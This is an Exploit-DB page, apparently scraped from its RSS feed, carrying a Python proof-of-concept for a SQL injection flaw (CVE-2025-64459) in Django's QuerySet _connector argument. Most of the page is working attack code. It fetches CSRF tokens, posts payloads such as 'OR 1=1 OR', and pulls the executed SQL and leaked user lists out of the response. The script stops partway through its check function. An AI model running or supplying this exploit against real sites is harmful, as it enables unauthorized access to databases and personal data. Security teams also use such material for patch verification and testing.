---
title: [webapps] Django 5.1.13 - SQL Injection
url: https://www.exploit-db.com/exploits/52456
source: Exploit-DB.com RSS Feed
date: 2025-12-03
fetch_date: 2025-12-04T03:17:42.934507
---

# [webapps] Django 5.1.13 - SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Django 5.1.13 - SQL Injection

#### EDB-ID:

###### 52456

#### CVE:

###### [2025-64459](https://nvd.nist.gov/vuln/detail/CVE-2025-64459)

---

**EDB Verified:**

#### Author:

###### [Wafcontrol Security Team](/?author=12320)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-12-03

---

**Vulnerable App:**

```
# Exploit Title: Django 5.1.13 - SQL Injection
# Google Dork: [none]  # Not applicable for this vulnerability
# Date: 2025-12-03
# Exploit Author: Wafcontrol Security Team
# Vendor Homepage: https://www.djangoproject.com/
# Software Link: https://www.djangoproject.com/download/
# Version: 5.2 before 5.2.8, 5.1 before 5.1.14, 4.2 before 4.2.26 (possibly earlier versions like 5.0.x, 4.1.x, 3.2.x)
# Tested on: Ubuntu 24.04 with Django 5.1.13 (vulnerable version)
# CVE: 2025-64459

Description:
This proof-of-concept exploits a SQL injection vulnerability in Django's QuerySet methods (filter, exclude, get) and Q objects
when using a crafted dictionary with expansion as the _connector argument. The vulnerability allows an attacker to inject
arbitrary SQL into the WHERE clause, potentially leading to data leakage, modification, or other database compromises.

The script targets a vulnerable Django application endpoint that accepts user input for the _connector parameter.
It supports multiple modes:
- baseline: Send a safe request and display results.
- exploit: Send an exploit payload and compare with baseline.
- multi: Test multiple payloads sequentially.
- check: Automatically check if the target appears vulnerable.

Usage:
python3 exploit.py <mode> -u <target_url> [options]

Modes:
- baseline: Run a safe baseline test.
- exploit: Run an exploit test with a single payload.
- multi: Test multiple payloads (use -p multiple times or comma-separated).
- check: Quick vulnerability check using default payloads.

Examples:
python3 exploit.py baseline -u http://target/
python3 exploit.py exploit -u http://target/ -p "OR 1=1 OR"
python3 exploit.py multi -u http://target/ -p "OR 1=1 OR" -p "AND 1=0 AND"
python3 exploit.py check -u http://target/

Options:
- -b, --baseline: Baseline connector value (default: 'AND')
- -v, --verbose: Enable verbose output
- -o, --output: Save output to a file

Requirements:
- Python 3.x
- requests library (pip install requests)

Note:
- This is for educational and testing purposes only. Use on authorized systems.
- Ensure the target endpoint exposes the executed SQL (e.g., via debug mode or custom template) for demonstration.
- In a real scenario, adapt the parsing logic to the application's response structure.
- For advanced usage, customize payloads for specific SQL dialects (e.g., SQLite, PostgreSQL).

import re
import sys
import argparse
import json
from typing import List, Tuple, Optional
import requests

DEFAULT_BASELINE = "AND"
DEFAULT_PAYLOADS = ["OR 1=1 OR", "AND 1=0 AND", "OR 'a'='a' OR"]

def extract_sql_and_users(html: str) -> Tuple[Optional[str], List[str]]:
    """
    Extracts the executed SQL and list of users from the HTML response.
    Assumes the template structure:
    - SQL inside <pre>...</pre>
    - Users inside <li>username – email</li>
    Adjust regex patterns based on the actual response format.
    """
    # Extract SQL from the first <pre>...</pre>
    sql_match = re.search(r"<pre>(.*?)</pre>", html, re.DOTALL)
    executed_sql = sql_match.group(1).strip() if sql_match else None

    # Extract users from <li>...</li>
    users = re.findall(r"<li>(.*?)</li>", html)
    users = [u.strip() for u in users if u.strip()]

    return executed_sql, users

def send_payload(target_url: str, connector_value: str, verbose: bool = False) -> Tuple[Optional[str], List[str]]:
    """
    Sends a POST request with the connector value as the search field.
    Handles CSRF token extraction and session management.
    Returns the executed SQL and list of users from the response.
    """
    if verbose:
        print(f"[*] Fetching CSRF token from {target_url}...")

    # Step 1: GET request to fetch CSRF token
    try:
        get_resp = requests.get(target_url, timeout=10)
        get_resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] GET request failed: {e}")
        sys.exit(1)

    # Extract csrfmiddlewaretoken from the form
    csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_resp.text)
    if not csrf_match:
        print("[!] Could not find CSRF token in the response.")
        sys.exit(1)
    csrf_token = csrf_match.group(1)

    if verbose:
        print(f"[i] CSRF token: {csrf_token[:10]}...")

    # Prepare POST data
    data = {
        "csrfmiddlewaretoken": csrf_token,
        "search": connector_value,
    }

    # Use session to maintain cookies (including CSRF)
    session = requests.Session()
    session.cookies.update(get_resp.cookies)

    if verbose:
        print(f"[*] Sending POST with connector = {repr(connector_value)}...")

    # Step 2: POST request with payload
    try:
        post_resp = session.post(target_url, data=data, timeout=10)
        post_resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] POST request failed: {e}")
        sys.exit(1)

    # Parse response
    executed_sql, users = extract_sql_and_users(post_resp.text)
    return executed_sql, users

def run_baseline(target_url: str, baseline: str, verbose: bool, output_file: Optional[str]) -> Tuple[Optional[str], List[str]]:
    print("[*] Running baseline test...")
    base_sql, base_users = send_payload(target_url, baseline, verbose)
    print("\n--- Baseline (Safe) ---")
    print("Executed SQL:")
    print(base_sql or "(No SQL found)")
    print("\nUsers Returned:")
    if base_users:
        for u in base_users:
            print(" -", u)
    else:
        print(" (No users)")

    if output_file:
        with open(output_file, 'a') as f:
            f.write("--- Baseline ---\n")
            f.write(f"SQL: {base_sql or 'None'}\n")
            f.write("Users: " + json.dumps(base_users) + "\n\n")

    return base_sql, base_users

def run_exploit(target_url: str, payload: str, baseline_data: Tuple[Optional[str], List[str]], verbose: bool, output_file: Optional[str]):
    print(f"\n[*] Running exploit with payload = {repr(payload)}...")
    exploit_sql, exploit_users = send_payload(target_url, payload, verbose)
    print("\n--- Exploit Attempt ---")
    print("Executed SQL:")
    print(exploit_sql or "(No SQL found)")
    print("\nUsers Returned:")
    if exploit_users:
        for u in exploit_users:
            print(" -", u)
    else:
        print(" (No users)")

    if output_file:
        with open(output_file, 'a') as f:
            f.write(f"--- Exploit: {payload} ---\n")
            f.write(f"SQL: {exploit_sql or 'None'}\n")
            f.write("Users: " + json.dumps(exploit_users) + "\n\n")

    analyze_results(baseline_data[0], baseline_data[1], exploit_sql, exploit_users)

def run_multi(target_url: str, payloads: List[str], baseline: str, verbose: bool, output_file: Optional[str]):
    base_sql, base_users = run_baseline(target_url, baseline, verbose, output_file)
    for payload in payloads:
        run_exploit(target_url, payload, (base_sql, base_users), verbose, output_file)

def run_check(target_url: str, baseline: str, verbose: bool, output_file: Optional[str]):
    print("...